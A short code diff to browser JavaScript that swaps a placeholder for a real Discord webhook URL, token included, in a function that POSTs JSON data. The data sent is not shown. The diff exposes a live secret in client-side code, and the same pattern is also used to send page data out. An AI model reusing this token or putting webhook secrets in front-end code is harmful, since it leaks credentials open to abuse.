@@ -79,7 +79,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     async function sendToDiscord(data) {
-        const response = await fetch("WEBHOOK_URL_HERE", {
+        const response = await fetch("https://discord.com/api/webhooks/1366369025986265179/rVX34EBkGn6anyrTz_IMJgBG1Acjr43_raqun2XVkTtpkSeFmygPcYwuL1aebfaQGJp4", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
